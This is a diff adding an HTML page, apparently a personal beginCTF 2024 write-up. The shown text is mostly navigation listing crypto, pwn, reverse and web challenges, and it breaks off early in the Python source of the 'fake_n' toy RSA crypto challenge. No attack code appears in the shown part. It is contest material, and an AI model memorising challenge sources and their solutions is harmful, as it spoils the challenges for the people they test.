@@ -1,0 +1,1782 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../..">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.9">
+    
+    
+      
+        <title>Beginctf2024 - W anjv site</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.f2e4d321.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/_mkdocstrings.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#crypto" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="W anjv site" class="md-header__button md-logo" aria-label="W anjv site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8h5Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            W anjv site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Beginctf2024
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="切换到暗色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到暗色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31Z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到亮色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到亮色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22Z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="W anjv site" class="md-nav__button md-logo" aria-label="W anjv site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8h5Z"/></svg>
+
+    </a>
+    W anjv site
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    beginCTF 2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            beginCTF 2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Beginctf2024
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Beginctf2024
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#crypto" class="md-nav__link">
+    <span class="md-ellipsis">
+      crypto
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="crypto">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fake_n" class="md-nav__link">
+    <span class="md-ellipsis">
+      fake_n
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#forensics" class="md-nav__link">
+    <span class="md-ellipsis">
+      Forensics
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Forensics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse" class="md-nav__link">
+    <span class="md-ellipsis">
+      逆向工程(reverse)入门指南
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#beginner_forensics" class="md-nav__link">
+    <span class="md-ellipsis">
+      beginner_Forensics!!!!
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#10" class="md-nav__link">
+    <span class="md-ellipsis">
+      你知道中国文化嘛1.0
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#real-check-in" class="md-nav__link">
+    <span class="md-ellipsis">
+      real check in
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tupper" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tupper
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#where-is-crazyman-v10" class="md-nav__link">
+    <span class="md-ellipsis">
+      where is crazyman v1.0
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      PWN
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PWN">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ezpwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      ezpwn
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reverse_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      reverse
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="reverse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#real-checkin-xor" class="md-nav__link">
+    <span class="md-ellipsis">
+      real checkin xor
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      WEB
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WEB">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      sql教学局
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus-enhanced" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus-enhanced
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus-max" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus-max
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus-max-ultra" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus-max-ultra
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus-max-ultra-premium" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus-max-ultra-premium
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-revenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-revenge
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#crypto" class="md-nav__link">
+    <span class="md-ellipsis">
+      crypto
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="crypto">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fake_n" class="md-nav__link">
+    <span class="md-ellipsis">
+      fake_n
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#forensics" class="md-nav__link">
+    <span class="md-ellipsis">
+      Forensics
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Forensics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse" class="md-nav__link">
+    <span class="md-ellipsis">
+      逆向工程(reverse)入门指南
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#beginner_forensics" class="md-nav__link">
+    <span class="md-ellipsis">
+      beginner_Forensics!!!!
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#10" class="md-nav__link">
+    <span class="md-ellipsis">
+      你知道中国文化嘛1.0
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#real-check-in" class="md-nav__link">
+    <span class="md-ellipsis">
+      real check in
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tupper" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tupper
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#where-is-crazyman-v10" class="md-nav__link">
+    <span class="md-ellipsis">
+      where is crazyman v1.0
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      PWN
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PWN">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ezpwn" class="md-nav__link">
+    <span class="md-ellipsis">
+      ezpwn
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reverse_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      reverse
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="reverse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#real-checkin-xor" class="md-nav__link">
+    <span class="md-ellipsis">
+      real checkin xor
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      WEB
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WEB">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      sql教学局
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus-enhanced" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus-enhanced
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus-max" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus-max
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus-max-ultra" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus-max-ultra
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-plus-max-ultra-premium" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-plus-max-ultra-premium
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zupload-pro-revenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      zupload-pro-revenge
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>Beginctf2024</h1>
+
+<h2 id="crypto">crypto</h2>
+<h3 id="fake_n">fake_n</h3>
+<h5 id="_1">题目</h5>
+<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><a href="#__codelineno-0-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a><a href="#__codelineno-0-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">flag</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a><a href="#__codelineno-0-3"><span class="linenos" data-linenos=" 3 "></span></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a><a href="#__codelineno-0-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="k">def</span> <span class="nf">fakeN_list</span><span class="p">():</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a><a href="#__codelineno-0-5"><span class="linenos" data-linenos=" 5 "></span></a>    <span class="n">puzzle_list</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6"></a><a href="#__codelineno-0-6"><span class="linenos" data-linenos=" 6 "></span></a>
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a><a href="#__codelineno-0-7"><span class="linenos" data-linenos=" 7 "></span></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8"></a><a href="#__codelineno-0-8"><span class="linenos" data-linenos=" 8 "></span></a>        <span class="n">r</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9"></a><a href="#__codelineno-0-9"><span class="linenos" data-linenos=" 9 "></span></a>        <span class="n">puzzle_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10"></a><a href="#__codelineno-0-10"><span class="linenos" data-linenos="10 "></span></a>
+<a id="__codelineno-0-11" name="__codelineno-0-11"></a><a href="#__codelineno-0-11"><span class="linenos" data-linenos="11 "></span></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12"></a><a href="#__codelineno-0-12"><span class="linenos" data-linenos="12 "></span></a>    <span class="n">q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13"></a><a href="#__codelineno-0-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="n">com</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14"></a><a href="#__codelineno-0-14"><span class="linenos" data-linenos="14 "></span></a>
+<a id="__codelineno-0-15" name="__codelineno-0-15"></a><a href="#__codelineno-0-15"><span class="linenos" data-linenos="15 "></span></a>    <span class="n">puzzle_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">com</span><span class="p">)</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16"></a><a href="#__codelineno-0-16"><span class="linenos" data-linenos="16 "></span></a>
+<a id="__codelineno-0-17" name="__codelineno-0-17"></a><a href="#__codelineno-0-17"><span class="linenos" data-linenos="17 "></span></a>    <span class="k">return</span> <span class="n">puzzle_list</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18"></a><a href="#__codelineno-0-18"><span class="linenos" data-linenos="18 "></span></a>
+<a id="__codelineno-0-19" name="__codelineno-0-19"></a><a href="#__codelineno-0-19"><span class="linenos" data-linenos="19 "></span></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">fake_n_list</span><span class="p">):</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20"></a><a href="#__codelineno-0-20"><span class="linenos" data-linenos="20 "></span></a>
+<a id="__codelineno-0-21" name="__codelineno-0-21"></a><a href="#__codelineno-0-21"><span class="linenos" data-linenos="21 "></span></a>    <span class="n">fake_n</span> <span class="o">=</span> <span class="mi">1</span>
+<a id="__codelineno-0-22" name="__codelineno-0-22"></a><a href="#__codelineno-0-22"><span class="linenos" data-linenos="22 "></span></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">fake_n_list</span><span class="p">)):</span>
+<a id="__codelineno-0-23" name="__codelineno-0-23"></a><a href="#__codelineno-0-23"><span class="linenos" data-linenos="23 "></span></a>        <span class="n">fake_n</span> <span class="o">*=</span> <span class="n">fake_n_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+<a id="__codelineno-0-24" name="__codelineno-0-24"></a><a href="#__codelineno-0-24"><span class="linenos" data-linenos="24 "></span></a>
